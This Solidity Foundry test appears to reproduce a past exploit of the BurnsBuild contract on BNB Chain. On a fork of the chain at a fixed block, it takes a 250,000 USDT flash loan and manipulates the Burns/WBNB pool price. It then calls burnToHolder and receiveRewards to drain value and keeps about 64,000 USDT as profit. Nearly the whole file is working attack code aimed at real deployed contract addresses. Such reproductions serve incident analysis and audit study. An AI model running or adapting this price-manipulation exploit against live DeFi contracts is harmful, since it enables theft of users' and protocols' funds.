// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWBNB.sol";
import "@interface/IDodo.sol";
import "@interface/IPancakeV2.sol";

import "./IBurnsBuild.sol";

IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
IERC20 constant Burns = IERC20(0x91f1d3C7ddB8d5E290e71f893baD45F16E8Bd7BA);
IWBNB constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

IDODO constant USDT_USDC_Pool = IDODO(
    0xD5F05644EF5d0a36cA8C8B5177FfBd09eC63F92F
);

IPancakePairV2 constant USDT_WBNB_Pool = IPancakePairV2(
    0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE
);
IPancakePairV2 constant Burns_WBNB = IPancakePairV2(
    0x928cd66dFA268C69a37Be93BF7759dc8Ee676Bf8
);
IPancakeRouterV2 constant PancakeRouter = IPancakeRouterV2(
    payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
);
IBurnsBuild constant BurnsBuild_ = IBurnsBuild(
    payable(0x4fb9657Ac5d311dD54B37A75cFB873b127Eb21FD)
);

contract BurnsDefiTest is Test {
    address alice = makeAddr("alice");

    function setUp() public {
        vm.createSelectFork("bsc", 35858189);

        vm.label(address(USDT), "USDT");
        vm.label(address(Burns), "Burns");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(USDT_USDC_Pool), "USDT_USDC_Pool");
        vm.label(address(USDT_WBNB_Pool), "USDT_WBNB_Pool");
        vm.label(address(Burns_WBNB), "Burns_WBNB");
        vm.label(address(PancakeRouter), "PancakeRouter");
        vm.label(address(BurnsBuild_), "BurnsBuild");
        vm.label(alice, "alice");

        deal(address(USDT), address(this), 0);
        deal(address(this), 0);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        print("USDT balance before", USDT.balanceOf(alice), 18);
        print("Burns balance before", Burns.balanceOf(alice), 18);

        // Borrow USDT
        bytes memory data = abi.encodePacked(uint8(49));
        USDT_USDC_Pool.flashLoan(250000 ether, 0, address(this), data);

        print("USDT balance after", USDT.balanceOf(alice), 18);
        print("Burns balance after", Burns.balanceOf(alice), 18);

        // USDT balance after: 64309.628561934633642636
        // Burns balance after: 56298.933430646287662030
    }

    function DSPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external {
        sender;
        quoteAmount;
        data;

        USDTToBurns(baseAmount);

        address[] memory path = new address[](2);
        path[0] = address(Burns);
        path[1] = address(WBNB);
        uint256 amountOut1 = 50e18;
        uint256 amountOut2 = address(Burns).balance - amountOut1;
        uint256[] memory amounts = PancakeRouter.getAmountsIn(amountOut1, path);

        // burnToHolder() use getAmountsOut() and Burns/WBNB pair for making calculations

        BurnsBuild_.burnToHolder(amounts[0], alice);
        amounts = PancakeRouter.getAmountsIn(amountOut2, path);
        BurnsBuild_.burnToHolder(amounts[0], alice);
        BurnsBuild_.receiveRewards(address(this));
        WBNB.deposit{value: address(this).balance}();

        WBNBToUSDT();
        BurnsToUSDT();

        USDT.transfer(address(USDT_USDC_Pool), baseAmount);
        USDT.transfer(alice, USDT.balanceOf(address(this)));
    }

    function USDTToBurns(uint256 amount) private {
        // Transfer borrowed USDT to USDT/WBNB pair and obtain WBNB to deposit to Burns/WBNB pair
        USDT.transfer(address(USDT_WBNB_Pool), amount);
        (uint112 reserveUSDT, uint112 reserveWBNB, ) = USDT_WBNB_Pool
            .getReserves();
        uint256 amountWBNB = PancakeRouter.getAmountOut(
            amount,
            reserveUSDT,
            reserveWBNB
        );
        // Deposit WBNB to Burns/WBNB
        USDT_WBNB_Pool.swap(0, amountWBNB, address(Burns_WBNB), "");

        (uint112 reserveBurns, uint112 _reserveWBNB, ) = Burns_WBNB
            .getReserves();
        uint256 amountBurns = PancakeRouter.getAmountOut(
            amountWBNB,
            _reserveWBNB,
            reserveBurns
        );
        // Swap deposited WBNB to Burns tokens
        Burns_WBNB.swap(amountBurns, 0, address(this), "");
    }

    function WBNBToUSDT() private {
        uint256 amountWBNB = WBNB.balanceOf(address(this));
        WBNB.transfer(address(USDT_WBNB_Pool), amountWBNB);
        (uint112 reserveUSDT, uint112 reserveWBNB, ) = USDT_WBNB_Pool
            .getReserves();
        uint256 amountUSDT = PancakeRouter.getAmountOut(
            amountWBNB,
            reserveWBNB,
            reserveUSDT
        );
        USDT_WBNB_Pool.swap(amountUSDT, 0, address(this), "");
    }

    function BurnsToUSDT() private {
        Burns.transfer(address(Burns_WBNB), Burns.balanceOf(address(this)));
        (uint112 reserveBurns, uint112 reserveWBNB, ) = Burns_WBNB
            .getReserves();
        uint256 amountWBNB = PancakeRouter.getAmountOut(
            Burns.balanceOf(address(Burns_WBNB)) - reserveBurns,
            reserveBurns,
            reserveWBNB
        );
        Burns_WBNB.swap(0, amountWBNB, address(USDT_WBNB_Pool), "");

        (uint112 reserveUSDT, uint112 _reserveWBNB, ) = USDT_WBNB_Pool
            .getReserves();
        uint256 amountUSDT = PancakeRouter.getAmountOut(
            amountWBNB,
            _reserveWBNB,
            reserveUSDT
        );
        USDT_WBNB_Pool.swap(amountUSDT, 0, address(this), "");
    }

    receive() external payable {}
}
